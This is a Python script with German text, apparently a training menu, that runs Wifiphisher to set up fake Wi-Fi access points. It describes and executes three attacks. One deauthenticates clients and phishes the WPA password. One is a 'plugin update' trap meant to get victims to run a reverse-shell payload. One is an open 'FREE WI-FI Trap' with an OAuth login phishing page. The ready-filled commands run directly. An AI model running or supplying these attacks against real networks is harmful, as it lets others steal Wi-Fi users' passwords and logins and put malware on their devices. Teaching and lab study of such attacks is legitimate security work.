#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import sys
import subprocess
import time
import subprocess

import colors
import generics
from generics import rlinput,execute,clearScreen,showCAPfiles,deauthClients
##
# !!!! Achtung Syntax kann sich denächst von Wifiphisher ändern -T -> -p
#
def Fake_Menu():
	attack = True
	while(attack==True):
		clearScreen()
		shellCols = colors.ShellColors
#TODO Text muss noch überarbeitet werden \"Evil Twin attack\"
		print shellCols.UNDERLINE + shellCols.HEADER + 'Untermenü: Fake-AP erstellen' + shellCols.ENDC +'\n'
		print("Mit sogenannten Fake-APs versucht ein Angreifer einen WLAN-Nutzer dazu zu bringen, sich mit einer Kopie eines"
			+ " Original-Access-Points zu verbinden und diesen dann durch geschicktes Phishing, Informationen vom Nutzer zu entlocken." 
			+ " Im Idealfall merkt der Nutzer nicht, dass er mit einem Fake-AP verbunden ist und somit Opfer einer Phishing-Attacke wurde." + '\n'
			+ "In diesen Tutorial betrachten wir drei unterschiedliche Szenarien:\n" 
			+ "Man in the Middle Anrgiff, Konferenz Wifi(Firmware Update) und Free Wifi")
		print("Hinweis: Für die ersten beiden Szenarien werden zwei WLAN-Interfaces mit Packet-Injection-Unterstützung benötigt.\n"
			+ "Wählen Sie nun das Szenario aus, dass Sie testen möchten. \n")
		print ('1. \"Man in the Middle\" \n'
			+ '2. \"Firmware Update\" scenario\n'
			+ '3. \"Free Wifi\" scenario\n')
		try:
			selection = input("Die Auswahl bitte hier eingeben und mit Enter bestätigen: ")
		except SyntaxError:
			selection=0
		if(selection==1):
#START WIFIPHISHER !!!TODO !!! Muss Besser Beschrieben werden
			print("Hierbei wird der zu angreifende Access-Point geklont. Anschließend sendet man Deauthentication-Pakete"
				+ " im Namen des legitimen Access-Points, dadurch werden die Verbindungen der Clients zum Legitimen AP getrennt."
				+ " Da zum einem ein AP bereitgestellt werden muss, zum Anderen die Deauthentication-Pakete gesendet"
				+ " werden müssen, braucht man zwei Wlan-Interfaces. Wahrscheinlich verbinden sich diese Clients nun mit der Fake-AP \” Evil-Twin\”."
				+ " Diese Clients werden nun auf eine Phishing-Seite weitergeleitet, wo Sie wegen eines Route-update aufgefordert werden"
				+ " das WPA-Passwort neu einzugeben.")
			command = rlinput('Starten des wifiphisher und durchführen des Angriffes: \n# ', 'wifiphisher')
			execute(command)
#END
		elif(selection==2):
			#START WIFIPHISHER !!!TODO !!! Muss Besser Beschrieben werden
			print("Der genannte Angriff ist sehr nützlich bei Verschlüsselten Access-Points (z.B. bei Konferenzen)" 
				+" wo das Passwort bekannt ist. Das \"Plugin Update\" Szenario stellt einen einfachen weg " 
				+ "zur Verfügung, die Opfer dazu zu bewegen, eine Schadsoftware auszuführen " 
				+ "(z.B. mit einem reverse shell payload).\n " 
				+ "Für diesen Angriff braucht man einen payload, dieser wird im Projekt mit der Datei \"payload\" bereitgestelt.\n "
				+ "Für diesen Angriff verwenden wir das Tool Wifiphisher. Wir übergebn ihn die "
				+ "parameter --essid \"Name des AP \", mit -T das Szenario und mit -pK das Passwort. "
				+ "Bei der Frage, welcher Payload verwendet werden muss, muss man \"payload\" angeben.")
			command = rlinput('Starten von wifiphisher und durchführen des Angriffes: \n# ', 'wifiphisher --essid CONFERENCE_WIFI_TRAP -T plugin_update -pK 12345678')
			execute(command)
				#END
		elif(selection==3):
			#START WIFIPHISHER !!!TODO !!! Muss Besser Beschrieben werden
			print("Hier greift man kein Netzwerk an. Man erstellt hier ein offenes"
				+ " Wifi Netzwerk mit dem Namen(ESSID) \”FREE WI-FI Trap\” dieses leitet daraufhin den Benutzer auf" 
				+ " eine vorgegebene Seite weiter, wo man um ins Internet zu kommen, sich anmelden muss. \n" )
			command = rlinput('Starten von wifiphisher und durchführen des Angriffes: \n# ', 'wifiphisher --nojamming --essid "FREE_WI-FI_Trap" -T oauth-login' )
			execute(command)
		#END
		#ReStart Networkmanager
		generics.restart_networkmanager()

		print('Ende des Fake-AP-Tutorials erreicht! \n Bitte wählen um fortzufahren: \n')
		# REset NEwtork networing stop network-manager stop "" start "" start
		print ('1. Zurück zum Menü \n'
			+ '2. Zurück zur Fake-AP-Übersicht\n' 
			+ '0. Fake-AP Tutorial beenden \n')
		try:
			selection = input("Die Auswahl bitte hier eingeben und mit Enter bestätigen: ")
		except SyntaxError:
			selection=0
		if(selection==1):
			attack = False
			return True
		elif(selection==2):
			attack=True
		else: 
			attack = False
			return False

#FINISHED FAKEAP ATTACK	